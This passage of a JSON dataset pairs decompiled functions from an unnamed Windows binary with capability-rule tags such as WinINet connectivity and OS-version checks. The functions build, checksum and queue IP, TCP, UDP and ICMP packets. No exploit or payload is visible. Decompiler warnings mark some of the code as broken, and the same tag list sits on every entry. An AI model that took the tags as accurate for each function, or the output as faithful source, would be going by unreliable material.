var_3ch;\n                                if (((*(var_3ch + 0xd) & 0xef) != 0) && (ppuVar4 = var_3ch,  0x16 < var_10h)) {\n                                    ppuVar4 = fcn.00049620(arg_18h, 0x16);\n                                    unique0x10000661 = ppuVar4;\n                                }\n                            }\n                        }\n                        else if (uVar1 == 0x11) {\n                            if (0x7 < var_10h) {\n                                var_4h = ppuVar5;\n                                if (arg_20h == 0) {\n                                    var_1ch = var_8h[3];\n                                    var_18h = var_8h[4];\n                                    var_14h._0_1_ = 0;\n                                    var_14h._1_1_ = *(var_8h + 9);\n                                    var_14h._2_2_ = *(ppuVar5 + 1);\n                                    if (*(ppuVar5 + 6) == 0) {\n                                        var_48h._0_2_ = 0;\n                                        ppuVar4 = ppuVar5;\n                                    }\n                                    else {\n                                        uVar2 = fcn.000354c0(ppuVar5 & 0xffff0000 | *(ppuVar5 + 1));\n                                        ppuVar4 = fcn.0004ea30(&var_1ch, var_4h, uVar2 & 0xffff);\n                                        var_48h._0_2_ = ppuVar4;\n                                    }\n                                    if (var_48h != 0) goto code_r0x0004f728;\n                                }\n                                arg_18h = ppuVar5 + 2;\n                                ppuVar4 = var_10h + -2;\n                                var_10h = ppuVar4;\n                                if ((((ppuVar4 < 0x17) ||\n                                     (ppuVar4 = fcn.00049620(arg_18h, 0x16),  unique0x1000066d = ppuVar4, \n                                     ppuVar4 == NULL)) &&\n                                    (ppuVar4 = fcn.000354c0(ppuVar4 & 0xffff0000 | *(var_4h + 2)), \n                                    (ppuVar4 & 0xffff) == 0x35)) &&\n                                   (*NULL = fcn.000508f0(arg_18h, var_10h, &var_21h, &var_38h, &var_58h, &var_54h), \n                                   ppuVar4 = *NULL,  *NULL != NULL)) {\n                                    var_40h = &var_38h;\n                                    ppuVar4 = NULL;\n                                    if (((var_21h & 1) != 0) && (arg_20h == 0)) {\n                                        var_74h = *arg_18h;\n                                        *arg_18h = var_54h;\n                                        var_10h = var_10h + -1;\n                                        ppuVar4 = var_10h;\n                                        arg_18h = ppuVar5 + 3;\n                                    }\n                                }\n                            }\n                        }\n                        else if (0x16 < var_10h) {\n                            ppuVar4 = fcn.00049620(ppuVar5, 0x16);\n                            unique0x10000609 = ppuVar4;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    else if (0x16 < var_10h) {\n        ppuVar4 = fcn.00049620(arg_18h, 0x16);\n        unique0x10000695 = ppuVar4;\n    }\ncode_r0x0004f728:\n    if ((stack0xffffffdc != NULL) && (arg_20h == 0)) {\n        if ((var_21h & 0x40) == 0) {\n            if (var_8h != NULL) {\n                *(var_8h + 2) = 0;\n                *(var_8h + 1) = 0;\n                *(var_8h + 6) = 0;\n                *(var_8h + 2) = 0;\n                *(var_8h + 10) = 0;\n            }\n            if (var_3ch != NULL) {\n                var_3ch[2] = NULL;\n                var_3ch[1] = NULL;\n                *(var_3ch + 4) = 0;\n                *(var_3ch + 3) = 0;\n                *(var_3ch + 0xd) = 0;\n                *(var_3ch + 0xe) = 0;\n                *(var_3ch + 0x12) = 0;\n            }\n            if (var_4h != NULL) {\n                *(var_4h + 6) = 0;\n                *(var_4h + 1) = 0;\n            }\n            if (((var_44h != NULL) && (*(var_44h + 2) = 0,  (var_21h & 1) != 0)) && (var_50h != NULL)) {\n                puVar3 = fcn.00035490(var_54h & 0x9fffffff);\n                *var_50h = puVar3;\n            }\n        }\n        var_6ch = arg_1ch - var_10h;\n        if ((stack0xffffffdc < 1) || (4 < stack0xffffffdc)) {\n            if (stack0xffffffdc == 0xa) {\n                var_60h = 0x4;\n            }\n            else {\n                var_60h = NULL;\n            }\n        }\n        else {\n            arg_18h = arg_18h + 0x16;\n            var_10h = var_10h + -0x16;\n            var_60h = stack0xffffffdc + -1;\n        }\n        if (var_40h == NULL) {\n            var_40h = arg_18h;\n            var_58h = var_10h;\n            arg_18h = NULL;\n            var_10h = NULL;\n        }\n        ppuVar4 = fcn.0004f8e0(arg_8h, arg_ch, arg_10h, arg_14h, var_5ch, var_6ch, var_40h, var_58h, var_60h, \n                               var_10h & 0xffffff00 | var_21h, var_74h, arg_18h, var_10h);\n    }\n    if ((stack0xffffffdc == NULL) || ((var_21h & 0x40) != 0)) {\n        var_88h = 1;\n    }\n    else {\n        var_88h = 0;\n    }\n    return ppuVar4 & 0xffffff00 | var_88h;\n}\n",
        "token_count": 3698
    },
    "0004f8e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl\nfcn.0004f8e0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h\n            , int32_t arg_24h, int32_t arg_28h, uint arg_2ch, int32_t arg_30h, uint arg_34h, int32_t arg_38h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if ((*0xb1c59beb == '\\0') && (piVar2 = fcn.00035230(arg_14h + 0x34 + arg_1ch + arg_24h + arg_38h),  piVar2 != NULL))\n    {\n        fcn.00078790(piVar2, 0, 0x34);\n        fcn.0007877e(piVar2 + 0xd, arg_10h, arg_14h);\n        fcn.0007877e(piVar2 + arg_14h + 0x34, arg_18h, arg_1ch);\n        fcn.0007877e(piVar2 + arg_1ch + arg_14h + 0x34, arg_20h, arg_24h);\n        fcn.0007877e(piVar2 + arg_24h + arg_1ch + arg_14h + 0x34, arg_34h, arg_38h);\n        piVar2[1] = arg_8h;\n        piVar2[2] = arg_ch;\n        piVar2[3] = piVar2 + 0xd;\n        piVar2[4] = arg_14h + arg_1ch;\n        piVar2[5] = piVar2 + arg_1ch + arg_14h + 0x34;\n        piVar2[6] = arg_24h;\n        piVar2[7] = arg_28h;\n        *(piVar2 + 8) = arg_2ch;\n        piVar2[10] = arg_30h;\n        piVar2[0xb] = piVar2 + arg_24h + arg_1ch + arg_14h + 0x34;\n        piVar2[0xc] = arg_38h;\n        (**0xb1bde00c)();\n        piVar1 = piVar2;\n        if (*0xb1c5a744 != NULL) {\n            **0xb1c5a744 = piVar2;\n            piVar1 = *0xb1c5a748;\n        }\n        *0xb1c5a748 = piVar1;\n        *0xb1c5a744 = piVar2;\n        (**0xb1bde010)();\n        fcn.000340b0(0xb1c5a718);\n    }\n    return;\n}\n",
        "token_count": 681
    },
    "0004fa80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0004fa80(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint32_t var_10h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    while( true ) {\n        piVar4 = 0xffffffff;\n        fcn.000340e0(0xb1c5a718, 0xffffffff);\n        if (*0xb1c59beb != '\\0') break;\n        while( true ) {\n            var_9h._0_1_ = (**0xb1bde00c)();\n            var_4h = *0xb1c5a748;\n            if ((*0xb1c5a748 != NULL) && (*0xb1c5a748 = **0xb1c5a748,  *0xb1c5a748 == NULL)) {\n                *0xb1c5a744 = 0;\n            }\n            (**0xb1bde010)();\n            if (var_4h == NULL) break;\n            if ((*(var_4h + 8) & 0x20) != 0) {\n                fcn.000509b0(0x4fb0d);\n            }\n            if ((((*(var_4h + 8) & 1) == 0) || ((*(var_4h + 8) & 2) != 0)) && (var_4h[4] < 0x81)) {\n                fcn.0007877e(&fcn.0004fa80::var_e0h, var_4h[3], var_4h[4]);\n                fcn.00078790(&fcn.0004fa80::var_e0h + var_4h[4], 0, 0x80 - var_4h[4]);\n                var_60h = var_4h[4];\n                var_5ch = *(var_4h + 8) & 9 | 2;\n                if (var_4h[1] == 0) {\n                    var_54h = var_4h[2];\n                }\n                else {\n                    var_54h = var_4h[1];\n                }\n                var_58h = var_4h[1] == 0;\n                iVar2 = fcn.000751d0(*(var_4h[7] * 4 + -0x4e3a58dc), var_4h[5], var_4h[6], &fcn.0004fa80::var_e0h, 0);\n                if ((iVar2 == 0) && (iVar2 = fcn.00037240(var_4h[7] * 8 + -0x4e3a58a8),  iVar2 == 0)) {\n                    fcn.0001a8e0(var_4h[7] * 8 + -0x4e3a58a8, 0xb1c1cd80, *(var_4h[7] * 4 + -0x4e3a58dc));\n                }\n            }\n            if ((*(var_4h + 8) & 1) != 0) {\n                iVar2 = var_4h[5];\n                unique0x00007a00 = var_4h[6];\n                if (((*(var_4h + 8) & 4) == 0) || (piVar4 = var_4h,  arg_8h = fcn.00050730(var_4h),  arg_8h == 0)) {\n                    *(var_4h + 8) = *(var_4h + 8) & 0xf9;\n                    uVar3 = fcn.000785f8(piVar4, iVar2);\n                    var_4h[6] = uVar3 % 0x20 + 0x21;\n                    if (((*(var_4h + 8) & 0x10) != 0) && (3 < var_4h[6])) {\n                        var_4h[6] = 3;\n                    }\n                    for (var_10h = 0; var_10h < var_4h[6]; var_10h = var_10h + 1) {\n                        uVar1 = fcn.000785f8(piVar4, iVar2);\n                        *(&fcn.0004fa80::var_50h + var_10h) = uVar1;\n                    }\n                    var_4h[5] = &fcn.0004fa80::var_50h;\n                    fcn.0004fea0(var_4h);\n                }\n                else {\n                    var_4h[5] = *(arg_8h + 0x14);\n                    var_4h[6] = *(arg_8h + 0x18);\n                    *(var_4h + 8) = *(var_4h + 8) & 0xfb | 2;\n                    fcn.0004fea0(var_4h);\n                    fcn.00035330(arg_8h);\n                }\n            }\n            fcn.00035330(var_4h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1297
    },
    "0004fd80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0004fd80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint8_t var_39h;\n    uint var_38h;\n    uint *var_4h;\n    \n    var_dch = arg_8h;\n    var_4h = &var_38h;\n    while( true ) {\n        fcn.00078790(&var_d0h, 0, 0x90);\n        if (*0xb1c59beb != '\\0') break;\n        iVar1 = fcn.000753e0(var_dch, &var_d4h, &var_40h, &var_d0h, 0xffffffff, 0);\n        if (iVar1 == 0) {\n            var_39h = var_4ch;\n            fcn.00078790(var_4h, 0, 0x34);\n            if (var_48h == 0) {\n                var_4h[1] = var_44h;\n            }\n            else {\n                var_4h[2] = var_44h;\n            }\n            var_4h[4] = var_50h;\n            var_4h[3] = &var_d0h;\n            var_4h[5] = var_d4h;\n            var_4h[6] = var_40h;\n            *(var_4h + 8) = var_39h;\n            if ((var_39h & 1) == 0) {\n                fcn.0004fea0(var_4h);\n            }\n            else {\n                fcn.00050520(var_4h);\n            }\n            fcn.00074e50(var_dch, var_d4h);\n        }\n        else {\n            var_dch = 10000;\n            fcn.000209a0(10000);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 521
    },
    "0004fea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Switch with 1 destination removed at 0x000502da\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0004fea0(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t arg_ch;\n    uint uVar6;\n    ushort extraout_var;\n    uint *puVar7;\n    uint *arg_8h_00;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint *var_44h;\n    int32_t var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    if ((*(arg_8h + 0x20) & 0x10) == 0) {\n        if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n            var_58h = 0x3c;\n        }\n        else {\n            var_58h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n        }\n        var_38h = fcn.00035230(var_58h);\n        if (var_38h == NULL) {\n            return;\n        }\n    }\n    else {\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + -4;\n        var_38h = fcn.00035230(*(arg_8h + 0x10) + 0x400);\n        if (var_38h == NULL) {\n            return;\n        }\n        var_20h = var_38h + *(arg_8h + 0x10);\n        var_24h = var_20h + 0x200;\n        var_40h = *(arg_8h + 0x30) + 4;\n        *var_24h = *(arg_8h + 0x28);\n        fcn.0007877e(var_20h + 0x204, *(arg_8h + 0x2c), *(arg_8h + 0x30));\n        iVar4 = fcn.00068ca0(var_24h, var_40h, *(arg_8h + 0x14), *(arg_8h + 0x18), (*(arg_8h + 0x20) & 2) != 0, var_20h\n                             , &var_30h);\n        if (iVar4 == 0) goto code_r0x00050483;\n        *(arg_8h + 0x18) = var_30h;\n    }\n    fcn.0007877e(var_38h, *(arg_8h + 0xc), *(arg_8h + 0x10));\n    if ((*(arg_8h + 0x20) & 0x10) == 0) {\n        fcn.0007877e(var_38h + *(arg_8h + 0x10), *(arg_8h + 0x14), *(arg_8h + 0x18));\n    }\n    var_3ch = var_38h;\n    var_18h = *(arg_8h + 0x10);\n    if (var_18h < 0xe) goto code_r0x00050483;\n    var_44h = var_38h;\n    var_3ch = var_38h + 0xe;\n    var_18h = var_18h - 0xe;\n    fcn.000504c0(var_38h + 6, var_38h, 6);\n    iVar2 = fcn.000354c0(CONCAT22(extraout_var, *(var_44h + 3)));\n    if (iVar2 == 0x800) {\n        if (var_18h < 0x14) goto code_r0x00050483;\n        var_8h = var_3ch;\n        uVar5 = *var_3ch & 0xf;\n        arg_ch = uVar5 * 4;\n        if ((arg_ch < 0x14) || (var_18h < arg_ch)) goto code_r0x00050483;\n        var_18h = var_18h + uVar5 * -4;\n        puVar7 = var_3ch + 3;\n        arg_8h_00 = var_3ch + 4;\n        var_3ch = var_3ch + uVar5;\n        fcn.000504c0(arg_8h_00, puVar7, 4);\n        *(var_8h + 6) = 0;\n        *(var_8h + 2) = 0x80;\n        *0xb1c5a740 = *0xb1c5a740 + 1;\n        uVar3 = fcn.000354c0(var_8h & 0xffff0000 | *0xb1c5a740);\n        *(var_8h + 1) = uVar3;\n        uVar3 = fcn.000354c0(*(arg_8h + 0x10) + -0xe + *(arg_8h + 0x18));\n        *(var_8h + 2) = uVar3;\n        *(var_8h + 10) = 0;\n        uVar3 = fcn.0004e6a0(var_8h, arg_ch);\n        *(var_8h + 10) = uVar3;\n        uVar1 = *(var_8h + 9);\n        if (uVar1 == 1) {\n            if (var_18h < 4) goto code_r0x00050483;\n            var_28h = var_3ch;\n            var_34h = var_18h;\n            if (*var_3ch - 8 < 10) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *var_3ch = 3;\n            *(var_3ch + 1) = 1;\n            puVar7 = var_3ch + 1;\n            uVar5 = var_18h - 4;\n            if ((*(arg_8h + 0x20) & 1) != 0) {\n                if ((*(arg_8h + 0x20) & 8) != 0) {\n                    *puVar7 = *(arg_8h + 0x28);\n                    puVar7 = var_3ch + 2;\n                    uVar5 = var_18h - 8;\n                }\n                var_18h = uVar5;\n                var_3ch = puVar7;\n                var_2ch = fcn.00035490(*var_3ch);\n                var_2ch = var_2ch & 0xbfffffff;\n                if ((*(arg_8h + 0x20) & 2) != 0) {\n                    var_2ch = var_2ch | 0x40000000;\n                }\n                uVar6 = fcn.00035490(var_2ch);\n                *var_3ch = uVar6;\n                puVar7 = var_3ch;\n                uVar5 = var_18h;\n            }\n            var_18h = uVar5;\n            var_3ch = puVar7;\n            *(var_28h + 2) = 0;\n            uVar3 = fcn.0004ec80(var_28h, var_34h + *(arg_8h + 0x18));\n            *(var_28h + 2) = uVar3;\n        }\n        else if (uVar1 == 6) {\n            if (var_18h < 0x14) goto code_r0x00050483;\n            var_1ch = var_3ch;\n            iVar4 = (*(var_3ch + 3) & 0xf0) >> 4;\n            fcn.000504c0(var_3ch + 2, var_3ch, 2);\n            var_50h = var_8h[3];\n            var_4ch = var_8h[4];\n            var_48h._0_1_ = 0;\n            var_48h._1_1_ = *(var_8h + 9);\n            var_48h._2_2_ = fcn.000354c0(var_18h + *(arg_8h + 0x18));\n            *(var_1ch + 4) = 0;\n            uVar3 = fcn.0004e7a0(&var_50h, var_1ch, var_18h + *(arg_8h + 0x18));\n            *(var_1ch + 4) = uVar3;\n            var_3ch = var_3ch + iVar4;\n            var_18h = var_18h + iVar4 * -4;\n        }\n        else if (uVar1 == 0x11) {\n            if (var_18h < 8) goto code_r0x00050483;\n            var_4h = var_3ch;\n            fcn.000504c0(var_3ch + 2, var_3ch, 2);\n            uVar3 = fcn.000354c0(*(arg_8h + 0x18) + 8);\n            *(var_4h + 1) = uVar3;\n            var_14h = var_8h[3];\n            var_10h = var_8h[4];\n            var_ch._0_1_ = 0;\n            var_ch._1_1_ = *(var_8h + 9);\n            var_ch._2_2_ = *(var_4h + 1);\n            *(var_4h + 6) = 0;\n            uVar5 = fcn.000354c0(var_8h & 0xffff0000 | *(var_4h + 1));\n            uVar3 = fcn.0004ea30(&var_14h, var_4h, uVar5 & 0xffff);\n            *(var_4h + 6) = uVar3;\n            var_3ch = var_3ch + 2;\n            var_18h = var_18h - 8;\n        }\n    }\n    if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3c) {\n        fcn.00078790(var_38h + *(arg_8h + 0x18) + *(arg_8h + 0x10), 0, 0x3c - (*(arg_8h + 0x10) + *(arg_8h + 0x18)));\n    }\n    if (*(arg_8h + 4) == 0) {\n        if (*(arg_8h + 8) != 0) {\n            if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n                var_68h = 0x3c;\n            }\n            else {\n                var_68h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n            }\n            fcn.0003ca00(*(arg_8h + 8), var_38h, var_68h);\n        }\n    }\n    else {\n        if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n            var_64h = 0x3c;\n        }\n        else {\n            var_64h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n        }\n        fcn.00052710(*(arg_8h + 4), var_38h, var_64h);\n    }\ncode_r0x00050483:\n    fcn.00035330(var_38h);\n    return;\n}\n",
        "token_count": 2906
    },
    "00050520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00050520(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint8_t var_15h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    (**0xb1bde00c)();\n    iVar1 = fcn.0006be20();\n    var_8h = NULL;\n    var_14h = *0xb1c5a738;\n    while (var_14h != NULL) {\n        if (iVar1 - var_14h[9] < 0xea61) {\n            var_8h = var_14h;\n            var_14h = *var_14h;\n        }\n        else {\n            puVar2 = *var_14h;\n            *0xb1c5a73c = *0xb1c5a73c - (var_14h[6] + 0x34 + var_14h[4]);\n            puVar5 = puVar2;\n            if (var_8h != NULL) {\n                *var_8h = puVar2;\n                puVar5 = *0xb1c5a738;\n            }\n            *0xb1c5a738 = puVar5;\n            if (puVar2 == NULL) {\n                *0xb1c5a74c = var_8h;\n            }\n            fcn.00035330(var_14h);\n            var_14h = puVar2;\n        }\n    }\n    (**0xb1bde010)();\n    puVar2 = fcn.00035230(arg_8h[6] + 0x34 + arg_8h[4]);\n    if (puVar2 == NULL) {\n        uVar4 = 0;\n    }\n    else {\n        puVar5 = arg_8h;\n        puVar6 = puVar2;\n        for (iVar1 = 0xd; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        puVar2[3] = puVar2 + 0xd;\n        puVar2[5] = puVar2[3] + puVar2[4];\n        fcn.0007877e(puVar2[3], arg_8h[3], arg_8h[4]);\n        fcn.0007877e(puVar2[5], arg_8h[5], arg_8h[6]);\n        uVar3 = fcn.0006be20();\n        puVar2[9] = uVar3;\n        *puVar2 = 0;\n        (**0xb1bde00c)();\n        if (*0xb1c5a73c + 0x34 + arg_8h[6] + arg_8h[4] < 0x20001) {\n            puVar5 = puVar2;\n            if (*0xb1c5a738 != NULL) {\n                **0xb1c5a74c = puVar2;\n                puVar5 = *0xb1c5a738;\n            }\n            *0xb1c5a738 = puVar5;\n            *0xb1c5a73c = puVar2[6] + 0x34 + puVar2[4] + *0xb1c5a73c;\n            var_15h = 1;\n            *0xb1c5a74c = puVar2;\n        }\n        else {\n            var_15h = 0;\n        }\n        uVar4 = (**0xb1bde010)();\n        uVar4 = uVar4 & 0xffffff00 | var_15h;\n    }\n    return uVar4;\n}\n",
        "token_count": 908
    },
    "00050730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t ** __cdecl fcn.00050730(int32_t arg_8h)\n\n{\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t **var_ch;\n    int32_t **var_8h;\n    uint var_1h;\n    \n    (**0xb1bde00c)();\n    var_8h = NULL;\n    for (var_ch = *0xb1c5a738; var_ch != NULL; var_ch = *var_ch) {\n        if (var_ch[4] == *(arg_8h + 0x10)) {\n            var_14h = *(arg_8h + 0xc);\n            var_18h = var_ch[3];\n            for (var_10h = *(arg_8h + 0x10); 3 < var_10h; var_10h = var_10h - 4) {\n                if (*var_18h != *var_14h) goto code_r0x000507be;\n                var_14h = var_14h + 1;\n                var_18h = var_18h + 1;\n            }\n            if (var_10h == 0) {\ncode_r0x00050840:\n                var_20h = 0;\n            }\n            else {\ncode_r0x000507be:\n                var_1ch = *var_18h - *var_14h;\n                if (var_1ch == 0) {\n                    if (var_10h == 1) goto code_r0x00050840;\n                    var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                    if (var_1ch == 0) {\n                        if (var_10h == 2) goto code_r0x00050840;\n                        var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                        if (var_1ch == 0) {\n                            if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                            goto code_r0x00050840;\n                        }\n                    }\n                }\n                var_20h = 1;\n                if (var_1ch < 1) {\n                    var_20h = -1;\n                }\n            }\n            if (var_20h == 0) break;\n        }\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *0xb1c5a738 = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        if (*var_ch == NULL) {\n            *0xb1c5a74c = var_8h;\n        }\n        *var_ch = NULL;\n        *0xb1c5a73c = *0xb1c5a73c - (var_ch[6] + 0xd + var_ch[4]);\n    }\n    (**0xb1bde010)();\n    return var_ch;\n}\n",
        "token_count": 754
    },
    "000508f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.000508f0(uint arg_8h, uint arg_ch, uint8_t *arg_10h, char *arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_1ch;\n    uint var_14h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00068910(arg_8h, arg_ch, &var_ch, arg_14h, &var_4h);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        if (var_4h == 0) {\n            *arg_18h = var_8h & 0x1f;\n            *arg_1ch = var_ch._3_1_;\n            *arg_10h = -((var_8h >> 5 & 1) != 0) & 2U | 0x11 | -((var_8h >> 6 & 1) != 0) & 4U;\n        }\n        else {\n            var_10h = arg_14h;\n            do {\n                cVar1 = *var_10h;\n                var_10h = var_10h + 1;\n            } while (cVar1 != '\\0');\n            *arg_18h = var_10h - (arg_14h + 1);\n            *arg_10h = 0x60;\n        }\n        uVar3 = 8;\n    }\n    return uVar3;\n}\n",
        "token_count": 392
    },
    "00050a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00050a20(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000786b8();\n    var_4h = 0;\n    while( true ) {\n        if (4 < var_4h) {\n            return 0;\n        }\n        if ((*(var_4h * 8 + -0x4e3a58a4) != 0) && (*(var_4h * 8 + -0x4e3a58a4) == iVar1)) break;\n        var_4h = var_4h + 1;\n    }\n    return 1;\n}\n",
        "token_count": 157
    },
    "00050a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00050a80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        iVar2 = *(arg_8h + 8);\n        if ((*(iVar2 + 0xe8) != 0) && (*(iVar2 + 0xe8) != -0x4e3e23b0)) {\n            *(iVar2 + 0x168) = *(iVar2 + 0xe8);\n            *(iVar2 + 0xe8) = 0xb1c1dc50;\n        }\n        if (((*(iVar2 + 0x164) != 0) && (cVar1 = fcn.00050f10(*(iVar2 + 0xd8), iVar2),  cVar1 != '\\0')) &&\n           (*(iVar2 + 0x164) != -0x4e3e2240)) {\n            *(iVar2 + 0x174) = *(iVar2 + 0x164);\n            *(iVar2 + 0x164) = 0xb1c1ddc0;\n        }\n        fcn.00050f70(*(iVar2 + 8));\n        if (((*0xb1c4640c != -1) && (arg_ch != 0)) &&\n           ((*0xb1c5b70c == 0 &&\n            (iVar2 = fcn.000631a0(*(*(iVar2 + 8) + *0xb1c4640c + 0x40), 0xb1c1e0f0, 0xb1c5b708),  iVar2 == 0)))) {\n            *0xb1c5b70c = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "00050b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
